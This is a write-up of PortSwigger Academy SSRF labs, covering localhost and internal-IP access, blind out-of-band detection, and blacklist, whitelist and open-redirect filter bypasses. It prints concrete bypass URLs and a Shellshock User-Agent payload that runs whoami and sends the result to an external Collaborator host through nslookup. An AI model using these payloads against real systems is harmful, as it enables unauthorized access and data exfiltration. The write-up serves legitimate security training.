# **SSRF**

***
![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/5a3184da-9922-45dd-bfd1-024e016625e9)

**_SSRF occurs when an attacker manipulates a vulnerable server-side component of a web application to make unauthorized requests to internal systems or external services, often bypassing security controls. This could lead to sensitive data exposure, unauthorized access to internal resources, or even complete compromise of the server._**

***



# Basic SSRF against local server


According to the lab description there is a **stock check feature which fetches data from an internal system**.

![](https://i.imgur.com/fMshhY4.png)




Go ahead and start up burpsuite to enumerate this further, We can make a request using the **Check stock** feature and then intercept this request with burpsuite


![](https://i.imgur.com/g3VDXRO.png)




We are asked to change the `stockApi` value to [http://localhost/admin](http://localhost/admin), doing this should show us an admin page with the function to delete users. we can go ahead and delete user `carlos`


![](https://i.imgur.com/Mp6cj1d.png)



# Basic [SSRF](https://portswigger.net/web-security/ssrf) against another back-end system



The task given for this lab is to use the stock check functionality to scan this internal IP `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`, There is definitely a way to do this with python more easily, but let use the manual method first. We can make any request to any IP and see if this works.






![](https://i.imgur.com/NN1Zg29.png)


It works, We can go ahead and create a number wordlist using bash one liner for loop


```bash
for i in {0..256}; do echo $i; done > num.txt
```


![](https://i.imgur.com/vi5pC49.png)



Now send this request to the intruder tab and mark the last offset of the IP as our target area



![](https://i.imgur.com/QM4oBuT.png)


Go ahead and set your payload as shown below and start the attack



![](https://i.imgur.com/V8MGCvN.png)


We should now be looking for the area that stands out, looks like we got a hit on `.151`, we can go ahead and delete the user `carlos` as asked



![](https://i.imgur.com/FeJdgrB.png)




# [Blind SSRF](https://portswigger.net/web-security/ssrf/blind) with out-of-band detection



According to lab description the site uses analytics software which fetches the URL specified in the `Referer` header when a product page is loaded. Meaning the vulnerability exist the Referer header but is blind 😶‍🌫️, Since we are asked to use Burp Collaborator for this task, we need to use burp suite professional version. Making a request to any product page and intercepting request with burpsuite we have  -:



![](https://i.imgur.com/FihS374.png)


We can go ahead and use the burp collaborator function and copy our payload



![](https://i.imgur.com/lFhnKoE.png)


Since we know that the blind ssrf vulnerability exists in the `referer` header we can go ahead and paste the payload copied from the collaborator in this section also make to add the `http://` prefix as this isn't embedded in the payload



![](https://i.imgur.com/hwPSj6N.png)


Navigate back to the collaborator tab and click **Poll now** and wait till you see the HTTP type request, once this is done, the lab should be solved. easy right 😼?? 


![](https://i.imgur.com/X9NlDcM.png)


# [SSRF](https://portswigger.net/web-security/ssrf) with blacklist-based input filter


According to the challenge the developer has deployed two weak anti-SSRF defenses that we will need to bypass. The objective still stays the same, "**a stock check feature which fetches data from an internal system**". We can go ahead and intercept the request using burpsuite again and send to the repeater tab. Exploiting the vulnerability we get a **"External stock check blocked for security reasons"** message 


![](https://i.imgur.com/Kyonl5P.png)



After several trials and error i finally came up with the `http://127.1/%2561dmin` payload since it was filtering our `127.0.0.1` and `localhost` and also the word `admin`, however using the following resources i was able to finalize that payload

1. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypass-using-octal-ip](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypass-using-octal-ip)

2. [https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#fuzzing](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#fuzzing)






![](https://i.imgur.com/CgCxjcL.png)



We can then go ahead and delete user `carlos` as usual 🤣


![](https://i.imgur.com/fgbzwrX.png)



# [SSRF](https://portswigger.net/web-security/ssrf) with filter bypass via open redirection vulnerability




Soooo on this one we need to change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and then delete the user `carlos` as usual :B, however the stock checker has been restricted to only access the local application, so we will need to find an open redirect affecting the application first.

We get an **Invalid URL** message when we edit the `stockApi` parameter with burpsuite.

![](https://i.imgur.com/rjjNVgc.png)

First we need to find an endpoint with open redirect vulnerability, Navigating to the **Targets --> Site map** tab and filtering by status code 300 we have few list


![](https://i.imgur.com/BQbog8I.png)



We can go ahead and send the second request to the **repeater** taB, Then copy the `/product/nextProduct?currentProductId=1&path=%2fproduct?productId=2` endpoint :)



![](https://i.imgur.com/TCxs5LA.png)


Now make a normal stock request and send to **repeater**, replacing the path value with `http://192.168.0.12:8080/admin`. As we can see we get a missing path parameter.



![](https://i.imgur.com/v09AeBB.png)



So let remove the `current` parameter with it values as this should work, we can then go ahead and delete user carlos


![](https://i.imgur.com/oYlGFeo.png)


# [Blind SSRF](https://portswigger.net/web-security/ssrf/blind) with Shellshock exploitation


In this lab the site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded, we need to perform a blind [SSRF attack](https://portswigger.net/web-security/ssrf) against an internal server in the `192.168.0.X` range on port 8080. then use a Shellshock payload against the internal server to exfiltrate the name of the OS user. SSRF to command injection 🤔

Making few enumeration i came across this [article](https://www.thehacker.recipes/web/inputs/ssrf#ssrf-with-command-injection) which says we need to inject our payload in the `User-Agent` Parameter however remember we still need to bruteforce for the IP range, remember how we did it the last time 😉


![](https://i.imgur.com/O5NxTMa.png)



Now make sure to set your payload to the number ranges and click start, you also need to use `/usr/bin/nslookup` instead and copy your payload from burp collaborator as shown earlier using it as a subdomain

```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).em43yvxowsqgiubilkmzzot35ublzbn0.oastify.com
```


![](https://i.imgur.com/qkjglW6.png)


Navigating back to the collaborator tab you should find the username as requested by the challenge 


![](https://i.imgur.com/eT8GEqV.png)




# [SSRF](https://portswigger.net/web-security/ssrf) with whitelist-based input filter


This was literally a pain in the ass for me 🥲 also, have this particular session of this challenge was copied from [here](https://infinitelogins.com/2021/01/09/server-side-request-forgery-ssrf-portswigger-academy-lab-examples/) so i will just drop the payload first


```
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```


In this example, there are a handful of bypasses we’ll need to implement.

First, we’ll try and issue a request to `localhost`. We find that the returned response tells us “stock.weliketoshop.net” must be included in the request.

![](https://infiniteloginscom.files.wordpress.com/2021/01/image-40.png?w=1024)

Knowing we’ll have to include that text in the request, we test to see if the application will accept embedded credentials by adding `username@` to our request. Doing so returns a different response, as if the webserver attempted to connect to “username”.

![](https://infiniteloginscom.files.wordpress.com/2021/01/image-41.png?w=1024)

This is great, but it’s pointless if we don’t have a way to indicate a URL fragment. We can usually utilize the # sign for this, but the application rejects requests that contain that character. To get around this, we’ll Double URL Encode the # sign so that it is represented by %2523. Notice how now the request goes through.

![](https://infiniteloginscom.files.wordpress.com/2021/01/image-42.png?w=1024)

Finally, we can replace “username” with localhost, and see that the response returns a webpage! By appending `/admin/delete?username=carlos`, we can issue a request that deletes the Carlos user.

![](https://infiniteloginscom.files.wordpress.com/2021/01/image-39.png?w=909)
